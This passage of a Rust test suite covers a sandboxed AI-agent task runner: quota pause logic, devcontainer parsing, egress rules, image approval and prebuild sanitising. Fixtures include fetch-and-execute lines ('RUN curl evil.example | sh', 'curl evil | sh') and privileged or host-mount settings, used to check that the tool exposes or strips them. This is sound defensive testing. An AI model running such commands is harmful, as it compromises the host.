        std::fs::write(&script, SCRIPT).unwrap();
        let sock = f.dir.join("echo.sock");
        let echo = UnixListener::bind(&sock).unwrap();
        std::thread::spawn(move || {
            for c in echo.incoming().flatten() {
                std::thread::spawn(move || {
                    let (mut r, mut w) = (c.try_clone().unwrap(), c);
                    let mut buf = [0u8; 4096];
                    while let Ok(n) = r.read(&mut buf) {
                        if n == 0 || w.write_all(&buf[..n]).is_err() {
                            break;
                        }
                    }
                    let _ = w.shutdown(std::net::Shutdown::Both);
                });
            }
        });
        let port = std::net::TcpListener::bind("127.0.0.1:0").unwrap().local_addr().unwrap().port();
        let listen = format!("127.0.0.1:{port}");
        let link = RelayLink::start(&[], script.to_str().unwrap(), &listen, &sock).unwrap();
        let workers: Vec<_> = (0..8u8)
            .map(|i| {
                let listen = listen.clone();
                std::thread::spawn(move || {
                    let mut c = std::net::TcpStream::connect(&listen).unwrap();
                    c.set_read_timeout(Some(std::time::Duration::from_secs(10))).unwrap();
                    let msg: Vec<u8> = (0..200_000).map(|j| (j as u8).wrapping_add(i)).collect();
                    let writer = { let mut w = c.try_clone().unwrap(); let m = msg.clone(); std::thread::spawn(move || w.write_all(&m).unwrap()) };
                    let mut got = vec![0u8; msg.len()];
                    c.read_exact(&mut got).unwrap();
                    writer.join().unwrap();
                    assert_eq!(got, msg, "connection {i} got its own bytes back");
                    c.shutdown(std::net::Shutdown::Both).unwrap();
                })
            })
            .collect();
        for w in workers {
            w.join().unwrap();
        }
        // A closed upstream closes the loopback side too.
        drop(link);
        std::thread::sleep(std::time::Duration::from_millis(300));
        assert!(std::net::TcpStream::connect(&listen).is_err(), "the relay stops with its link");
        let bad = RelayLink::start(&["false".into()], "x", &listen, &sock);
        assert!(bad.unwrap_err().to_string().contains("did not start"));
    }
}

mod quota {
    use crate::quota::QuotaSignal;
    use chrono::{Local, TimeZone};

    fn h(pairs: &[(&str, &str)]) -> Vec<(String, String)> {
        pairs.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect()
    }

    #[test]
    fn subscription_api_key_and_openai_headers_are_understood() {
        let now = 1_800_000_000;
        let sub = QuotaSignal::from_response(200, &h(&[("anthropic-ratelimit-unified-status", "allowed"), ("anthropic-ratelimit-unified-5h-utilization", "0.42"), ("anthropic-ratelimit-unified-5h-reset", "1800003600"), ("anthropic-ratelimit-unified-7d-utilization", "0.81"), ("anthropic-ratelimit-unified-7d-reset", "1800400000")]), now);
        assert_eq!((sub.limited, sub.utilization, sub.resets_at, sub.remaining), (false, Some(0.81), Some(1800400000), None), "the busiest window counts: {sub:?}");
        let rejected = QuotaSignal::from_response(200, &h(&[("anthropic-ratelimit-unified-status", "rejected"), ("anthropic-ratelimit-unified-reset", "1800000900"), ("anthropic-ratelimit-unified-5h-utilization", "100")]), now);
        assert!(rejected.limited && rejected.resets_at == Some(1800000900) && rejected.utilization == Some(1.0), "a percentage is accepted too: {rejected:?}");
        let key = QuotaSignal::from_response(200, &h(&[("anthropic-ratelimit-requests-limit", "50"), ("anthropic-ratelimit-requests-remaining", "49"), ("anthropic-ratelimit-requests-reset", "2027-01-01T00:00:00Z"), ("anthropic-ratelimit-tokens-limit", "40000"), ("anthropic-ratelimit-tokens-remaining", "4000"), ("anthropic-ratelimit-tokens-reset", "2027-01-01T00:00:10Z")]), now);
        assert_eq!((key.remaining, key.resets_at, key.utilization), (Some(0.1), Some(1798761610), None), "the tightest limit and its reset: {key:?}");
        let oa = QuotaSignal::from_response(200, &h(&[("x-ratelimit-limit-requests", "100"), ("x-ratelimit-remaining-requests", "90"), ("x-ratelimit-reset-requests", "1s"), ("x-ratelimit-limit-tokens", "1000"), ("x-ratelimit-remaining-tokens", "50"), ("x-ratelimit-reset-tokens", "6m0s")]), now);
        assert_eq!((oa.remaining, oa.resets_at), (Some(0.05), Some(now + 360)), "{oa:?}");
        let ms = QuotaSignal::from_response(429, &h(&[("x-ratelimit-limit-tokens", "10"), ("x-ratelimit-remaining-tokens", "0"), ("x-ratelimit-reset-tokens", "250ms"), ("retry-after", "2")]), now);
        assert!(ms.limited && ms.resets_at == Some(now + 1) && ms.retry_after == Some(2), "{ms:?}");
        let overloaded = QuotaSignal::from_response(529, &[], now);
        assert!(overloaded.limited && overloaded.describe().contains("529"));
        let none = QuotaSignal::from_response(200, &h(&[("content-type", "text/event-stream")]), now);
        assert!(!none.limited && none.utilization.is_none() && none.remaining.is_none() && none.describe().contains("no quota information"));
    }

    #[test]
    fn the_reserve_decides_when_to_pause_and_the_reset_when_to_resume() {
        let mut p = super::policy();
        let now = Local.with_ymd_and_hms(2026, 10, 6, 12, 0, 0).unwrap();
        let t = now.timestamp();
        let sig = |utilization: f64, resets_at: Option<i64>| QuotaSignal { seen_at: t, status: 200, limited: false, utilization: Some(utilization), remaining: None, resets_at, retry_after: None };
        assert!(p.pause_until(&sig(0.5, Some(t + 3600)), now).is_none(), "half used, 20% reserve: keep going");
        let (until, reason) = p.pause_until(&sig(0.85, Some(t + 3600)), now).unwrap();
        assert_eq!(until, now + chrono::Duration::seconds(3600));
        assert!(reason.contains("85%") && reason.contains("20%"), "{reason}");
        assert!(p.pause_until(&sig(0.85, Some(t - 1)), now).is_none(), "the window reset since: try again");
        p.reserve_pct = 0;
        assert!(p.pause_until(&sig(0.99, Some(t + 60)), now).is_none(), "no reserve: only a refusal pauses");
        let refused = QuotaSignal { seen_at: t, status: 429, limited: true, utilization: None, remaining: None, resets_at: None, retry_after: Some(45) };
        let (until, reason) = p.pause_until(&refused, now).unwrap();
        assert_eq!(until, now + chrono::Duration::seconds(45));
        assert!(reason.contains("refused"));
        let bare = QuotaSignal { seen_at: t, status: 529, limited: true, utilization: None, remaining: None, resets_at: None, retry_after: None };
        assert_eq!(p.pause_until(&bare, now).unwrap().0, now + chrono::Duration::seconds(crate::policy::DEFAULT_PAUSE_SECS), "no reset given: a short default pause");
        p.reserve_pct = 20;
        let key = QuotaSignal { seen_at: t, status: 200, limited: false, utilization: None, remaining: Some(0.15), resets_at: Some(t + 10), retry_after: None };
        assert!(p.pause_until(&key, now).unwrap().1.contains("15%"), "API-key remaining counts against the reserve too");
    }
}

mod quota_runner {
    use super::{fixture, policy, task};
    use crate::audit::AuditLog;
    use crate::harness::Harness;
    use crate::manifest::{TaskManifest, TrustedProjects};
    use crate::meter::UsageMeter;
    use crate::queue::{InMemoryQueue, QueueClient};
    use crate::quota::QuotaSignal;
    use crate::runner::{Runner, Tick};
    use crate::sandbox::{DirSandbox, Workspace};
    use chrono::Local;
    use std::sync::{Arc, Mutex};

    /// A harness whose quota signal the test sets, and that can hit the limit mid-run.
    struct QuotaHarness {
        signal: Arc<Mutex<Option<QuotaSignal>>>,
        limit_during_run: Arc<Mutex<bool>>,
        runs: Arc<Mutex<u32>>,
    }
    impl Harness for QuotaHarness {
        fn quota(&self) -> Option<QuotaSignal> {
            self.signal.lock().unwrap().clone()
        }
        fn run(&self, task: &TaskManifest, _ws: &Workspace, meter: &mut UsageMeter) -> crate::Result<String> {
            *self.runs.lock().unwrap() += 1;
            meter.record(10)?;
            if *self.limit_during_run.lock().unwrap() {
                let now = Local::now().timestamp();
                *self.signal.lock().unwrap() = Some(QuotaSignal { seen_at: now, status: 429, limited: true, utilization: None, remaining: None, resets_at: Some(now + 120), retry_after: None });
                return Err(crate::Error::Quota("the provider refused a request (status 429)".into()));
            }
            Ok(format!("ok: {}", task.prompt))
        }
    }

    #[test]
    fn the_runner_pauses_at_the_reserve_and_gives_a_task_back_when_the_limit_hits_mid_run() {
        let f = fixture("quota-runner");
        let mut trusted = TrustedProjects::default();
        trusted.insert("a", f.key_a.verifying_key());
        let signal: Arc<Mutex<Option<QuotaSignal>>> = Default::default();
        let limit_during_run = Arc::new(Mutex::new(false));
        let runs = Arc::new(Mutex::new(0));
        let h = QuotaHarness { signal: signal.clone(), limit_during_run: limit_during_run.clone(), runs: runs.clone() };
        let mut r = Runner::new(policy(), trusted, crate::manifest::generate_key(), InMemoryQueue::default(), h, DirSandbox { root: f.dir.join("work") }, |_: &TaskManifest, _: &crate::result::SignedResult| true, AuditLog::new(f.dir.join("audit.jsonl")));
        r.queue.post(task("q1", "a", 100, &f.key_a).sign(&f.key_a).unwrap());
        r.queue.post(task("q2", "a", 100, &f.key_a).sign(&f.key_a).unwrap());

        // 1. Over the reserve: nothing is claimed, the pause is logged once.
        let now = Local::now().timestamp();
        *signal.lock().unwrap() = Some(QuotaSignal { seen_at: now, status: 200, limited: false, utilization: Some(0.9), remaining: None, resets_at: Some(now + 600), retry_after: None });
        for _ in 0..3 {
            assert!(matches!(r.tick(Local::now()).unwrap(), Tick::Paused { reason, .. } if reason.contains("90%")));
        }
        assert_eq!(r.queue.available().unwrap().len(), 2, "nothing claimed while paused");
        assert_eq!(*runs.lock().unwrap(), 0);
        let log = r.audit.entries().unwrap();
        assert_eq!(log.iter().filter(|e| e.outcome == "paused").count(), 1, "logged once, not every tick: {log:?}");

        // 2. The window reset: work resumes.
        *signal.lock().unwrap() = Some(QuotaSignal { seen_at: now, status: 200, limited: false, utilization: Some(0.9), remaining: None, resets_at: Some(now - 1), retry_after: None });
        assert_eq!(r.tick(Local::now()).unwrap(), Tick::Submitted("q1".into()));

        // 3. The limit hits during a task: the lease goes back, the task is not marked failed or
        //    refused, and the runner pauses until the reset the provider gave.
        *limit_during_run.lock().unwrap() = true;
        let before = Local::now();
        match r.tick(Local::now()).unwrap() {
            Tick::Paused { until, reason } => {
                assert!(reason.contains("refused"), "{reason}");
                assert!(until >= before + chrono::Duration::seconds(110) && until <= Local::now() + chrono::Duration::seconds(121), "{until}");
            }
            other => panic!("{other:?}"),
        }
        assert_eq!(r.queue.available().unwrap().len(), 1, "q2 is available again for any runner");
        let log = r.audit.entries().unwrap();
        assert!(log.iter().any(|e| e.task_id == "q2" && e.outcome == "released"), "{log:?}");
        assert!(!log.iter().any(|e| e.task_id == "q2" && (e.outcome == "failed" || e.outcome == "aborted")));
        // Still paused on the next tick, from the signal alone.
        assert!(matches!(r.tick(Local::now()).unwrap(), Tick::Paused { .. }));
        // Once the pause is over and the limit is gone, the same task runs.
        *limit_during_run.lock().unwrap() = false;
        *signal.lock().unwrap() = None;
        assert_eq!(r.tick(Local::now()).unwrap(), Tick::Submitted("q2".into()));
        assert_eq!(*runs.lock().unwrap(), 3);
    }
}

mod control {
    use crate::control::*;
    use std::os::unix::fs::PermissionsExt;

    #[test]
    fn the_token_is_created_once_private_and_reused() {
        let f = super::fixture("control");
        let a = load_or_create_token(&f.dir).unwrap();
        assert_eq!(a.len(), 64);
        assert_eq!(std::fs::metadata(token_path(&f.dir)).unwrap().permissions().mode() & 0o777, 0o600);
        assert_eq!(load_or_create_token(&f.dir).unwrap(), a, "the daemon and `toto ui` share it");
        std::fs::write(token_path(&f.dir), "short").unwrap();
        assert_ne!(load_or_create_token(&f.dir).unwrap(), "short", "a damaged file is replaced");
        assert!(!is_paused(&f.dir));
        pause(&f.dir).unwrap();
        assert!(is_paused(&f.dir));
        resume(&f.dir).unwrap();
        resume(&f.dir).unwrap();
        assert!(!is_paused(&f.dir));
    }
}

mod devcontainer {
    use crate::devcontainer::*;

    const KEY: &str = "abababababababababababababababababababababababababababababababab";

    fn with(extra: &str) -> String {
        format!("{{\"customizations\": {{\"toto\": {{\"id\": \"acme\", \"name\": \"A\", \"public_key\": \"{KEY}\", \"kinds\": [\"fix\"]}}}}{extra}}}")
    }

    #[test]
    fn image_references_must_be_qualified_and_pinned_to_a_tag_or_digest() {
        let digest = format!("ghcr.io/a/b@sha256:{}", "ab".repeat(32));
        for good in ["ghcr.io/acme/env:1.2", "quay.io/a/b/c:v1", "registry.example.com:5000/x/y:latest", "localhost/env:dev", digest.as_str()] {
            assert!(valid_image_ref(good), "{good}");
        }
        for bad in ["alpine", "alpine:3", "acme/env:1", "ghcr.io/acme/env", "ghcr.io/acme/ENV:1", "ghcr.io/acme/env:1 --privileged", "ghcr.io/a/b@sha256:short", "ghcr.io/a/b:", "-v/x:/y:rw", "ghcr.io//b:1", ""] {
            assert!(!valid_image_ref(bad), "{bad}");
        }
    }

    #[test]
    fn jsonc_comments_and_trailing_commas_are_handled_without_touching_strings() {
        let v: serde_json::Value = serde_json::from_str(&strip_jsonc("{ \"url\": \"http://x//y /* not a comment */\", // c\n \"a\": [1, 2,], /* b */ \"q\": \"\\\" // still string\", }")).unwrap();
        assert_eq!(v["url"], "http://x//y /* not a comment */");
        assert_eq!(v["a"], serde_json::json!([1, 2]));
        assert_eq!(v["q"], "\" // still string");
    }

    #[test]
    fn the_image_comes_from_toto_or_the_top_level_and_host_keys_are_only_noted() {
        let top = parse(&with(", \"image\": \"ghcr.io/a/b:1\"")).unwrap();
        assert_eq!((top.image.as_deref(), top.builds), (Some("ghcr.io/a/b:1"), false));
        let both = parse(&with(", \"build\": {\"dockerfile\": \"Dockerfile\"}, \"customizations\": {\"toto\": {\"id\": \"acme\", \"name\": \"A\", \"public_key\": \"abababababababababababababababababababababababababababababababab\", \"kinds\": [\"fix\"], \"image\": \"ghcr.io/a/b:2\"}}")).unwrap();
        assert_eq!((both.image.as_deref(), both.builds), (Some("ghcr.io/a/b:2"), true), "the published image wins over the developers' build");
        assert!(both.notes.iter().any(|n| n.contains("published one")), "{:?}", both.notes);
        let build_only = parse(&with(", \"build\": {\"dockerfile\": \"Dockerfile\"}, \"features\": {\"ghcr.io/devcontainers/features/node:1\": {}}, \"onCreateCommand\": \"npm ci\", \"postCreateCommand\": \"npm test\", \"runArgs\": [\"--privileged\"], \"mounts\": [\"source=/,target=/h,type=bind\"], \"remoteUser\": \"root\"")).unwrap();
        assert_eq!((build_only.image, build_only.builds), (None, true));
        let notes = build_only.notes.join("\n");
        for want in ["prebuilds it", "`onCreateCommand` runs at prebuild", "`postCreateCommand` never runs", "not applied", "runArgs", "mounts", "unprivileged user"] {
            assert!(notes.contains(want), "missing `{want}` in:\n{notes}");
        }
        for (what, text) in [
            ("no toto", "{\"image\": \"ghcr.io/a/b:1\"}".to_string()),
            ("unqualified", with(", \"image\": \"node:20\"")),
            ("nothing to run", with("")),
            ("bad id", with(", \"image\": \"ghcr.io/a/b:1\"").replace("\"id\": \"acme\"", "\"id\": \"Acme!\"")),
            ("bad agent path", with(", \"image\": \"ghcr.io/a/b:1\"").replace("\"kinds\"", "\"agent\": \"../x\", \"kinds\"")),
            ("not an object", "[]".into()),
        ] {
            assert!(parse(&text).is_err(), "{what} should be refused");
        }
    }
}

mod agent_dir {
    use crate::agent::*;
    use std::collections::BTreeMap;

    fn files(cfg: &str) -> BTreeMap<String, Vec<u8>> {
        BTreeMap::from([("config.yaml".to_string(), cfg.as_bytes().to_vec())])
    }

    #[test]
    fn the_summary_says_what_the_contributor_needs_to_know() {
        let s = summarize(&files("executor:\n  type: omnigent\n  config: {harness: codex}\nprompt: |\n  First line.\n  Second.\ntools:\n  web: {type: mcp, url: https://mcp.example/sse}\n  local: {type: mcp, command: npx, args: [x]}\n")).unwrap();
        assert_eq!((s.harness.as_str(), s.provider()), ("codex", Some(crate::proxy::Provider::OpenAi)));
        assert_eq!(s.prompt_preview, "First line.");
        assert!(s.needs_network, "a URL server needs a network");
        assert!(s.warnings.iter().any(|w| w.contains("no executor.model")));
        assert!(s.warnings.iter().any(|w| w.contains("reached by URL")));
        assert_eq!(s.mcp.len(), 2);
        let text = s.describe().join("\n");
        assert!(text.contains("OpenAI API key") && text.contains("mcp         web: https://mcp.example/sse"), "{text}");
    }

    #[test]
    fn egress_rule_syntax() {
        for good in ["GET api.github.com/repos/org/**", "GET,POST *.github.com/**", "* pypi.org/**", "HEAD 172.17.0.1/**"] {
            assert!(valid_egress_rule(good), "{good}");
        }
        for bad in ["api.github.com", "get api.github.com/x", "GET evil.com@x.com/x", "GET host", "GET ho st/x", "GET %2e.com/x", " /x", "GET /x"] {
            assert!(!valid_egress_rule(bad), "{bad}");
        }
    }

    #[test]
    fn limits_and_unsafe_paths_are_refused() {
        let mut f = files("executor:\n  type: omnigent\n  config: {harness: claude-sdk}\n  model: m\n");
        f.insert("skills/Bad Name/SKILL.md".into(), vec![]);
        assert!(summarize(&f).unwrap_err().to_string().contains("skill directory"));
        let mut f = files("executor:\n  type: omnigent\n  config: {harness: claude-sdk}\n  model: m\n");
        f.insert("../escape".into(), vec![]);
        assert!(summarize(&f).unwrap_err().to_string().contains("unsafe path"));
        let mut f = files("executor:\n  type: omnigent\n  config: {harness: claude-sdk}\n  model: m\n");
        f.insert("big.bin".into(), vec![0; (MAX_BYTES + 1) as usize]);
        assert!(summarize(&f).unwrap_err().to_string().contains("limit"));
        assert!(summarize(&BTreeMap::new()).unwrap_err().to_string().contains("no config.yaml"));
    }
}

mod owner_guide_examples {
    use crate::manifest::TaskManifest;

    const DEVCONTAINER: &str = include_str!("../docs/examples/project/.devcontainer/devcontainer.json");
    const TASK: &str = include_str!("../docs/examples/project/task.json");
    const AGENT_DIR: &str = concat!(env!("CARGO_MANIFEST_DIR"), "/docs/examples/project/.toto/agent");

    /// The files in the owner guide must work together: the devcontainer parses, the agent
    /// directory is one toto can run, the task matches the project, and a contributor's policy admits it.
    #[test]
    fn the_example_project_works_end_to_end_with_policy() {
        let key = crate::manifest::generate_key();
        let hex_key = hex::encode(key.verifying_key().to_bytes());
        let dc = crate::devcontainer::parse(&DEVCONTAINER.replace("<hex key printed by `toto project-key project.key`>", &hex_key)).unwrap();
        assert_eq!(dc.image.as_deref(), Some("ghcr.io/acme/toto-env:1.0"));
        assert!(dc.builds && dc.toto.agent.as_deref() == Some(".toto/agent"));
        let mut files = std::collections::BTreeMap::new();
        let records = crate::archive::pack_dir(std::path::Path::new(AGENT_DIR), crate::archive::Limits::new(1 << 20)).unwrap();
        for r in records {
            if let crate::archive::Record::File { path, data, .. } = r {
                files.insert(path, data);
            }
        }
        let summary = crate::agent::summarize(&files).unwrap();
        assert_eq!((summary.harness.as_str(), summary.skills.as_slice()), ("claude-sdk", &["changelog".to_string()][..]));
        assert!(summary.needs_network && summary.needs_nested_sandbox() && summary.egress_rules.len() == 2 && summary.model.is_some(), "{summary:?}");
        assert!(summary.warnings.is_empty(), "the example is clean: {:?}", summary.warnings);

        let t: TaskManifest = serde_json::from_str(TASK).unwrap();
        assert_eq!((t.project_id.as_str(), t.kind.as_str()), (dc.toto.id.as_str(), dc.toto.kinds[0].as_str()));
        t.sign(&key).unwrap();
        let mut cfg = crate::config::Config::starter(&super::fixture("guide").dir);
        let info = crate::image::ImageInfo { id: "sha256:1".into(), digest: Some(format!("sha256:{}", "cd".repeat(32))), user: String::new(), env: vec![], entrypoint: vec![], cmd: vec![], size: 1, history: vec![] };
        let approval = crate::projects::Approval::new("ghcr.io/acme/toto-env:1.0", info, &files, None, false).unwrap();
        crate::projects::add(&mut cfg, "acme/docs", &dc, approval, &crate::projects::AddOptions { share: 1, token_file: None }).unwrap();
        assert!(cfg.policy.admit(&t, 0, chrono::Local::now()).is_ok(), "{:?}", cfg.policy.admit(&t, 0, chrono::Local::now()));
    }
}

mod image_approval {
    use crate::image::*;

    fn info(digest: Option<&str>, user: &str, env: &[&str], steps: &[&str]) -> ImageInfo {
        ImageInfo { id: "sha256:id".into(), digest: digest.map(String::from), user: user.into(), env: env.iter().map(|s| s.to_string()).collect(), entrypoint: vec![], cmd: vec![], size: 4_000_000, history: steps.iter().map(|s| s.to_string()).collect() }
    }

    #[test]
    fn the_pinned_reference_is_the_digest_when_pulled_and_the_id_when_built_here() {
        let i = info(Some("sha256:aa"), "", &[], &[]);
        assert_eq!(i.pinned("ghcr.io/acme/env:1.0"), "ghcr.io/acme/env@sha256:aa");
        assert_eq!(i.pinned("registry.example.com:5000/x/y:latest"), "registry.example.com:5000/x/y@sha256:aa");
        assert_eq!(i.pinned("ghcr.io/a/b@sha256:ff"), "ghcr.io/a/b@sha256:aa", "the approved digest wins over a digest in the name");
        assert_eq!(info(None, "", &[], &[]).pinned("toto/acme:abc"), "sha256:id", "a local build is pinned by id");
        assert_eq!(repo_of("localhost:5000/env"), "localhost:5000/env");
    }

    #[test]
    fn an_update_shows_exactly_what_changed() {
        let old = info(Some("sha256:aa"), "", &["PATH=/bin"], &["RUN apt-get install git", "FROM debian"]);
        let new = info(Some("sha256:bb"), "app", &["PATH=/bin", "TOKEN_URL=http://x"], &["RUN curl evil.example | sh", "RUN apt-get install git", "FROM debian"]);
        let text = diff(&old, &new).join("\n");
        for want in ["content     sha256:aa -> sha256:bb", "user", "+ env       TOKEN_URL=http://x", "+ step      RUN curl evil.example | sh"] {
            assert!(text.contains(want), "missing `{want}` in:\n{text}");
        }
        assert!(!text.contains("- step") && !text.contains("- env"), "{text}");
        assert!(diff(&old, &old).is_empty(), "no change, no noise");
        assert!(diff(&new, &old).join("\n").contains("- step      RUN curl evil.example | sh"));
        let shown = describe("ghcr.io/a/b:1", &new).join("\n");
        assert!(shown.contains("sha256:bb") && shown.contains("RUN curl evil.example | sh") && shown.contains("TOKEN_URL"), "{shown}");
    }

    /// Live: what the contributor is shown comes from the image itself, and the runner starts exactly the approved content.
    #[test]
    fn live_inspection_reads_the_real_image_and_the_sandbox_runs_the_pinned_image() {
        use crate::sandbox::{exec, DockerSandbox, Environment, Sandbox};
        if !super::proxy_container::docker_has("alpine") {
            eprintln!("skipping: needs docker and alpine");
            return;
        }
        let i = inspect("docker", "alpine", false).unwrap();
        assert!(i.id.starts_with("sha256:"));
        assert!(i.history.iter().any(|h| h.contains("alpine-minirootfs")), "the build steps come from the image: {:?}", i.history);
        assert!(i.env.iter().any(|e| e.starts_with("PATH=")) && i.size > 1_000_000);
        let pinned = i.pinned("alpine");
        let mut sb = DockerSandbox::new();
        sb.environments.insert("a".into(), Environment { image: pinned.clone(), network: false });
        let key = crate::manifest::generate_key();
        let t = super::task("pin-1", "a", 1, &key);
        let ws = sb.create(&t, &t.sandbox_profile).unwrap();
        let out = exec(&ws, &["sh", "-c", "cat /etc/os-release | head -1"], std::time::Duration::from_secs(20)).unwrap();
        sb.destroy(ws).unwrap();
        assert!(String::from_utf8_lossy(&out.stdout).contains("Alpine"), "ran the pinned image {pinned}: {}", String::from_utf8_lossy(&out.stdout));
        assert!(inspect("docker", "toto-no-such-image-here", false).is_err());
    }
}

mod prebuild {
    use crate::prebuild::*;

    #[test]
    fn the_override_keeps_the_build_and_prebuild_commands_and_drops_host_keys() {
        let text = r#"{ // dev file
          "build": {"dockerfile": "Dockerfile"}, "features": {"ghcr.io/devcontainers/features/node:1": {}},
          "onCreateCommand": "npm ci", "updateContentCommand": "npm run build", "postCreateCommand": "npm test", "postStartCommand": "svc",
          "runArgs": ["--privileged"], "mounts": ["source=/,target=/h,type=bind"], "privileged": true, "capAdd": ["SYS_ADMIN"],
          "initializeCommand": "curl evil | sh", "forwardPorts": [3000], "remoteUser": "dev", "customizations": {"toto": {"id": "x"}}
        }"#;
        let v: serde_json::Value = serde_json::from_str(&sanitize(text, "toto-egress").unwrap()).unwrap();
        for kept in ["build", "features", "onCreateCommand", "updateContentCommand", "remoteUser", "customizations"] {
            assert!(v.get(kept).is_some(), "{kept} must be kept");
        }
        for gone in ["postCreateCommand", "postStartCommand", "mounts", "privileged", "capAdd", "initializeCommand", "forwardPorts"] {
            assert!(v.get(gone).is_none(), "{gone} must be dropped");
        }
        assert_eq!(v["runArgs"], serde_json::json!(["--cap-drop=ALL", "--security-opt=no-new-privileges", "--network=toto-egress"]), "toto's run flags replace the project's");
        assert_eq!(v["updateRemoteUserUID"], false);
        assert_eq!(tag_for("acme", Some("c0ffee0123456789abcdef"), ""), "toto/acme:c0ffee012345");
        assert_eq!(tag_for("acme", None, "{}").len(), "toto/acme:".len() + 12);
    }

    /// Live: a Dockerfile-based project with an onCreateCommand is prebuilt by the reference CLI
    /// under toto's flags, committed, and runs as a task image with the installed state present.
    #[test]
    fn live_prebuild_with_the_devcontainer_cli() {
        use crate::sandbox::{exec, DockerSandbox, Environment, Sandbox};
        let cli = std::env::var("DEVCONTAINER_CLI").unwrap_or_else(|_| DEFAULT_CLI.into());
        if cli_version(&cli).is_none() || !super::proxy_container::docker_has("alpine") {
            eprintln!("skipping: needs docker, alpine and the dev container CLI (DEVCONTAINER_CLI)");
            return;
        }
        let f = super::fixture("prebuild");
        let repo = f.dir.join("repo");
        std::fs::create_dir_all(repo.join(".devcontainer")).unwrap();
        std::fs::write(repo.join(".devcontainer/Dockerfile"), "FROM alpine\nRUN adduser -D dev\n").unwrap();
        let dc = r#"{"build": {"dockerfile": "Dockerfile"}, "runArgs": ["--privileged"], "mounts": ["source=/,target=/host,type=bind"],
            "onCreateCommand": "echo installed-at-prebuild > /home/dev/marker; (cat /proc/1/status | grep CapEff) > /home/dev/caps",
            "postCreateCommand": "echo post > /home/dev/post", "remoteUser": "dev",
            "customizations": {"toto": {"id": "pb", "name": "pb", "public_key": "abababababababababababababababababababababababababababababababab", "kinds": ["x"]}}}"#;
        std::fs::write(repo.join(".devcontainer/devcontainer.json"), dc).unwrap();
        let git = |args: &[&str]| assert!(std::process::Command::new("git").current_dir(&repo).args(args).status().unwrap().success());
        git(&["init", "-q", "-b", "main"]);
        git(&["-c", "user.email=t@t", "-c", "user.name=t", "add", "."]);
        git(&["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "init"]);
        let commit = String::from_utf8(std::process::Command::new("git").current_dir(&repo).args(["rev-parse", "HEAD"]).output().unwrap().stdout).unwrap().trim().to_string();

        let pb = Prebuild { bin: "docker".into(), cli, network: "none".into(), work_dir: f.dir.join("work") };
        let (tag, info) = pb.build(repo.to_str().unwrap(), Some(&commit), "pb", dc, ".devcontainer/devcontainer.json").unwrap();
        assert_eq!(tag, format!("toto/pb:{}", &commit[..12]));
        assert!(info.id.starts_with("sha256:"), "a local build is pinned by content: {info:?}");
        assert!(info.pinned(&tag).contains("sha256:"), "never the moving tag: {}", info.pinned(&tag));
        assert!(info.history.iter().any(|h| h.contains("adduser")), "{:?}", info.history);

        let mut sb = DockerSandbox::new();
        sb.environments.insert("pb".into(), Environment { image: info.pinned(&tag), network: false });
        let t = super::task("pb-1", "pb", 1, &f.key_a);
        let ws = sb.create(&t, &t.sandbox_profile).unwrap();
        let out = exec(&ws, &["sh", "-c", "cat /home/dev/marker; cat /home/dev/caps; ls /home/dev/post 2>&1; ls -d /host 2>&1; id -u"], std::time::Duration::from_secs(20)).unwrap();
        sb.destroy(ws).unwrap();
        let text = String::from_utf8_lossy(&out.stdout).to_string();
        assert!(text.contains("installed-at-prebuild"), "the prebuild's install is in the snapshot: {text}");
        assert!(text.contains("CapEff:\t0000000000000000"), "the prebuild ran without capabilities: {text}");
        assert!(text.contains("post: No such file") && text.contains("/host: No such file"), "postCreateCommand did not run and the host mount was dropped: {text}");
        assert!(text.trim().ends_with("65534"), "the task still runs unprivileged in the snapshot: {text}");
    }
}
